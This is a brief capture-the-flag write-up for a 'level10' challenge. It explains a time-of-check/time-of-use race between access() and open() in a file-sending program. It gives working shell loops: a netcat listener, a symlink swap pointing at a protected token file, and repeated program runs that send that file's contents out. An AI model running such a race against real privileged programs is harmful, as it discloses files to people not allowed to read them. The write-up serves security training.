- When we entered to level10 user, we found 2 files: level08: executable file, 
  token we don’t have permission to read it.


- We found that the program take two arguments (a file, a host).

- It sends file to host if we have access to it, so we launch a listener in our machine with netcat in port 6969 

    (nc -l 6969)

- We created a testfile /tmp/test with test as data.

- We execute the program and we got the the data in our machine

- We tried to create a symbolic link for token in tmp but it didn’t work

- we run ltrace cmd to trace the program and we found that the program is using 
  the access func to check the permission.

- This function is vulnerable to check permissions and like what the man said

- We exploited this security hole by bu using the time between access and open to change the file.

// open connection in the machine listenner
  while true; do nc -l 6969; done 

// create a tmp file
  echo “” > /tmp/a

// launch a loop that create a symbolic link to (/tmp/a, token), and delete it
  while true; do ln -s /tmp/a /tmp/b; rm -f /tmp/b; ln -s ~/token /tmp/b; rm -f /tmp/b ; done

// launch a loop that exucute the program with /tmp/b
  while true; do ./level10 /tmp/b  ${host}; done


- It’s work and we got the flag.
